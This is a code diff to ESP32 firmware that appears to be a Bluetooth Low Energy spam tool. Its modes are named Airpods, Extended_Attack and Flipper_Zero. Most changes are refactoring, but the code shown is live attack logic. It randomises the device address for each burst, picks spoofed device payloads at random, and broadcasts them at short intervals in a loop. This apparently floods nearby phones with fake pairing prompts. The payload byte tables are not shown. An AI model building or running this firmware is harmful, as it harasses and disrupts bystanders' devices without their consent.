@@ -13,7 +13,7 @@ BLEAdvertising *pAdvertising;
 int attack_state = 1;
 int device_choice = 0;
 int device_index = 0;
-std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";
+BLEUUID device_uuid("00003082-0000-1000-9000-00805f9b34fb");
 
 uint32_t delayMilliseconds = 1000;
 
@@ -115,40 +115,40 @@ void setup() {
 }
 
 
-BLEAdvertisementData getAdvertismentData(){
+BLEAdvertisementData getAdvertismentData() {
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  if (device_choice == 0){
-    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
+  if (device_choice == 0) {
+    oAdvertisementData.addData(String((char*)DEVICES[device_index], 31));
   }
-  else if(device_choice == 1){
-    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[device_index], 23));
+  else if (device_choice == 1) {
+    oAdvertisementData.addData(String((char*)SHORT_DEVICES[device_index], 23));
   }
-  else if(device_choice == 2){
+  else if (device_choice == 2) {
     int payload_choice = random(2);
-    if (payload_choice == 0){
+    if (payload_choice == 0) {
       int index = random(17);
-      oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
+      oAdvertisementData.addData(String((char*)DEVICES[index], 31));
     }
     else {
       int index = random(12);
-      oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+      oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
     }
   }
-  else if(device_choice == 3){
+  else if (device_choice == 3) {
     int payload_choice = random(2);
-    if (payload_choice == 0){
-      oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[2], 23));
+    if (payload_choice == 0) {
+      oAdvertisementData.addData(String((char*)SHORT_DEVICES[2], 23));
     }
     else {
-      oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[8], 23));
+      oAdvertisementData.addData(String((char*)SHORT_DEVICES[8], 23));
     }
   }
 
   int adv_type_choice = random(3);
-  if (adv_type_choice == 0){
+  if (adv_type_choice == 0) {
     pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-  } else if (adv_type_choice == 1){
+  } else if (adv_type_choice == 1) {
     pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
   } else {
     pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
@@ -264,39 +264,42 @@ void selectDevice(int selectedPacket) {
   }
 }
 
+
 void loop() {
   Buttons::updateButtons();
   if (lastPressedButton == 0) {
-    if (attack_state == 1){
-    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    for (int i = 0; i < 6; i++){
-      dummy_addr[i] = random(256);
-      if (i == 0){
+    if (attack_state == 1) {
+      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+      for (int i = 0; i < 6; i++) {
+        dummy_addr[i] = random(256);
+        if (i == 0) {
           dummy_addr[i] |= 0xF0;
+        }
       }
-    }
-    selectDevice(selectedPacket);
-    
-    BLEAdvertisementData oAdvertisementData = getAdvertismentData();
+      selectDevice(selectedPacket);
+      
+      BLEAdvertisementData oAdvertisementData = getAdvertismentData();
 
-    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
-    pAdvertising->addServiceUUID(device_uuid);
-    pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+      pAdvertising->addServiceUUID(device_uuid);
+      pAdvertising->setAdvertisementData(oAdvertisementData);
 
-    pAdvertising->setMinInterval(0x20);
-    pAdvertising->setMaxInterval(0x20);
-    pAdvertising->setMinPreferred(0x20);
-    pAdvertising->setMaxPreferred(0x20);
-    
-    pAdvertising->start();
-    delay(delayMilliseconds); // delay for delayMilliseconds ms
-    pAdvertising->stop();
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMaxInterval(0x20);
+      pAdvertising->setMinPreferred(0x20);
+      pAdvertising->setMaxPreferred(0x20);
+      
+      pAdvertising->start();
+      delay(delayMilliseconds);
+      pAdvertising->stop();
     }
   }
   else if (lastPressedButton == 1) {
     pAdvertising->stop();
   }
 }
+
+
 
 void Airpods() {
   device_choice = 0;
@@ -487,8 +490,8 @@ void Extended_Attack(){
   attack_state = 1;
 }
 
-void Flipper_Zero(){
+void Flipper_Zero() {
   device_choice = 3;
   attack_state = 1;
-  device_uuid = "00003082-0000-1000-8000-00805f9b34fb";
+  device_uuid = BLEUUID("00003082-0000-1000-8000-00805f9b34fb");
 }
